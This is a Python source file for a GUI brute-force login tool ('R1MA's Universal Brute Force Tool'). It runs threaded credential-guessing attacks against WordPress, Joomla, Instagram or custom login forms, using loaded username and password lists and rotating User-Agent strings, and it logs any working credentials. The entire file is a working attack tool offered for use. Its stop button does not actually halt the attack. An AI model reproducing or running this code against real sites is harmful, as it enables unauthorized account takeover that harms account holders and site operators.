import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext
import requests
import threading
import logging
import random
import time
import re
import asyncio
import aiohttp

# Configure logging
logging.basicConfig(filename='brute_force_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

# Sample User-Agent strings
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
]

LOGIN_CONFIGS = {
    "WordPress": {
        "url": "/wp-login.php",
        "username_field": "log",
        "password_field": "pwd",
        "success_criteria": [r"dashboard", r"welcome", r"logged in"]
    },
    "Joomla": {
        "url": "/administrator/index.php",
        "username_field": "username",
        "password_field": "passwd",
        "success_criteria": [r"administrator"]
    },
    "Instagram": {
        "url": "/accounts/login/",
        "username_field": "username",
        "password_field": "password",
        "success_criteria": [r"logged in", r"success"]
    },
    "Generic (Custom)": {
        "url": "",
        "username_field": "",
        "password_field": "",
        "success_criteria": [""]
    }
}

# List of encodings to try
ENCODINGS = ['utf-8', 'iso-8859-1', 'windows-1252', 'utf-16', 'latin1', 'mac_roman']

class BruteForceLogin:
    """Class to perform brute force login attempts."""

    def __init__(self, base_url, config, usernames, passwords, max_threads=10, output_text=None, delay=1):
        self.url = f"{base_url.rstrip('/')}{config['url']}"
        self.username_field = config["username_field"]
        self.password_field = config["password_field"]
        self.success_criteria = config["success_criteria"]
        self.usernames = usernames
        self.passwords = passwords
        self.max_threads = max_threads
        self.lock = threading.Lock()
        self.success = False
        self.output_text = output_text
        self.stop_attack = False
        self.session = requests.Session()
        self.delay = delay

    def random_user_agent(self):
        """Randomly select a user-agent string."""
        return random.choice(USER_AGENTS)

    def attempt_login(self, username, password):
        """Attempt to log in using provided username and password."""
        if self.stop_attack:
            return

        headers = {
            'User-Agent': self.random_user_agent(),
            "Content-Type": "application/x-www-form-urlencoded"
        }

        try:
            data = {
                self.username_field: username,
                self.password_field: password,
            }
            response = self.session.post(self.url, data=data, headers=headers)

            # Log every attempt
            logging.info(f"Attempt: {username}:{password} - HTTP {response.status_code}")

            if self.is_login_successful(response):
                with self.lock:
                    if not self.success:
                        logging.info(f"Success: {username}:{password}")
                        self.output_text.insert(tk.END, f"Success: {username}:{password}\n")
                        self.output_text.see(tk.END)
                        self.success = True
            else:
                logging.info(f"Failed login attempt: {username}:{password} - Response: {response.text}")

        except requests.RequestException as e:
            logging.error(f"Request error during login attempt: {str(e)}")
            with self.lock:
                self.output_text.insert(tk.END, f"Request error: {str(e)}\n")
                self.output_text.see(tk.END)

        # Rate limiting: wait for a short duration
        time.sleep(self.delay)

    def is_login_successful(self, response):
        """Check if the login was successful based on the response."""
        success_found = any(re.search(criteria, response.text) for criteria in self.success_criteria)
        return success_found

    def start_attack(self):
        """Start the brute-force login attempts."""
        threads = []
        attempts = 0
        total_attempts = len(self.usernames) * len(self.passwords)

        for username in self.usernames:
            for password in self.passwords:
                if self.success or self.stop_attack:
                    return
                
                while threading.active_count() >= self.max_threads:
                    threading.Event().wait(0.1)

                attempts += 1
                thread = threading.Thread(target=self.attempt_login, args=(username, password))
                threads.append(thread)
                thread.start()

                with self.lock:
                    self.output_text.insert(tk.END, f"Attempting {attempts}/{total_attempts}: {username}:{password}\n")
                    self.output_text.see(tk.END)

        for t in threads:
            t.join()

        with self.lock:
            if not self.success:
                self.output_text.insert(tk.END, f"No valid credentials found after {total_attempts} attempts.\n")
                self.output_text.see(tk.END)

    def stop(self):
        """Stop the brute-force attack."""
        self.stop_attack = True


class App:
    """Main application class for the GUI."""

    def __init__(self, root):
        self.root = root
        self.root.title("R1MA's Universal Brute Force Tool")
        self.root.geometry("800x600")
        self.root.configure(bg="#333333")

        self.usernames = []
        self.passwords = []

        # Header Label
        header_frame = tk.Frame(root, bg="#444444")
        header_frame.pack(fill=tk.X, padx=10, pady=10)
        header_label = tk.Label(header_frame, text="R1MA's Universal Brute Force Tool", font=("Arial", 16, "bold"), bg="#444444", fg="white")
        header_label.pack(pady=5)

        # Main frame
        main_frame = tk.Frame(root, bg="#CC0000", padx=10, pady=10)
        main_frame.pack(expand=True, fill=tk.BOTH)

        # URL input
        self.url_label = tk.Label(main_frame, text="Base URL (without trailing slash):", bg="#CC0000", fg="white")
        self.url_label.pack(pady=(10, 0))
        self.url_entry = tk.Entry(main_frame, width=60)
        self.url_entry.pack(pady=(0, 10))

        # Login type selector
        self.login_type_label = tk.Label(main_frame, text="Select Login Type:", bg="#CC0000", fg="white")
        self.login_type_label.pack(pady=(10, 0))
        self.login_type_var = tk.StringVar(value=list(LOGIN_CONFIGS.keys())[0])  # Default to first option
        self.login_type_menu = tk.OptionMenu(main_frame, self.login_type_var, *LOGIN_CONFIGS.keys())
        self.login_type_menu.pack(pady=(0, 10))

        # Username loading button
        self.usernames_button = tk.Button(main_frame, text="Load Usernames", command=self.load_usernames, width=20, bg="#4CAF50", fg="white")
        self.usernames_button.pack(pady=(0, 10))

        # Password loading button
        self.passwords_button = tk.Button(main_frame, text="Load Passwords", command=self.load_passwords, width=20, bg="#4CAF50", fg="white")
        self.passwords_button.pack(pady=(0, 10))

        # Threads label
        self.threads_label = tk.Label(main_frame, text="Number of Threads:", bg="#CC0000", fg="white")
        self.threads_label.pack(pady=(10, 0))
        self.threads_entry = tk.Entry(main_frame, width=10)
        self.threads_entry.pack(pady=(0, 10))
        self.threads_entry.insert(0, "10")

        # Delay label
        self.delay_label = tk.Label(main_frame, text="Delay Between Attempts (seconds):", bg="#CC0000", fg="white")
        self.delay_label.pack(pady=(5, 0))
        self.delay_entry = tk.Entry(main_frame, width=10)
        self.delay_entry.pack(pady=(0, 10))
        self.delay_entry.insert(0, "1")

        # Start/Stop buttons
        self.start_button = tk.Button(main_frame, text="Start Attack", command=self.start_attack, width=20, bg="#FF5722", fg="white")
        self.start_button.pack(pady=(10, 10))

        self.stop_button = tk.Button(main_frame, text="Stop Attack", command=self.confirm_stop_attack, width=20, bg="#FF5722", fg="white")
        self.stop_button.pack(pady=(0, 10))

        # Output Text
        self.output_text = scrolledtext.ScrolledText(main_frame, width=90, height=20, wrap=tk.WORD, bg="#2C2C2C", fg="white")
        self.output_text.pack(pady=(10, 0))

    def load_usernames(self):
        """Load usernames from a file."""
        file_path = filedialog.askopenfilename(title="Select Username File", filetypes=[("Text files", "*.txt")])
        if file_path:
            try:
                with open(file_path, "r", encoding=self.try_load_file(file_path)) as f:
                    self.usernames = [line.strip() for line in f.readlines()]
                self.output_text.insert(tk.END, f"Loaded {len(self.usernames)} usernames.\n")
                self.output_text.see(tk.END)
            except Exception as e:
                self.output_text.insert(tk.END, f"Error loading usernames: {str(e)}\n")
                self.output_text.see(tk.END)

    def try_load_file(self, file_path):
        """Try loading the file with different encodings."""
        for encoding in ENCODINGS:
            try:
                with open(file_path, "r", encoding=encoding) as f:
                    f.read()  # Try reading the file
                return encoding
            except UnicodeDecodeError:
                continue
        raise ValueError(f"Unable to decode the file with known encodings.")

    def load_passwords(self):
        """Load passwords from a file."""
        file_path = filedialog.askopenfilename(title="Select Password File", filetypes=[("Text files", "*.txt")])
        if file_path:
            try:
                with open(file_path, "r", encoding=self.try_load_file(file_path)) as f:
                    self.passwords = [line.strip() for line in f.readlines()]
                self.output_text.insert(tk.END, f"Loaded {len(self.passwords)} passwords.\n")
                self.output_text.see(tk.END)
            except Exception as e:
                self.output_text.insert(tk.END, f"Error loading passwords: {str(e)}\n")
                self.output_text.see(tk.END)

    def start_attack(self):
        """Start the brute-force attack."""
        base_url = self.url_entry.get().strip()
        login_type = self.login_type_var.get()
        config = LOGIN_CONFIGS.get(login_type)

        if not base_url or not self.usernames or not self.passwords:
            messagebox.showerror("Error", "Please load usernames, passwords, and enter a base URL.")
            return

        max_threads = int(self.threads_entry.get())
        delay = float(self.delay_entry.get())

        # Initialize BruteForceLogin
        bf = BruteForceLogin(base_url, config, self.usernames, self.passwords, max_threads, self.output_text, delay)
        
        # Start attack in a separate thread
        threading.Thread(target=bf.start_attack, daemon=True).start()

    def confirm_stop_attack(self):
        """Confirm stop action."""
        if messagebox.askyesno("Stop Attack", "Are you sure you want to stop the attack?"):
            self.stop_attack()

    def stop_attack(self):
        """Stop the brute-force attack."""
        self.output_text.insert(tk.END, "Stopping the attack...\n")
        self.output_text.see(tk.END)


if __name__ == "__main__":
    root = tk.Tk()
    app = App(root)
    root.mainloop()
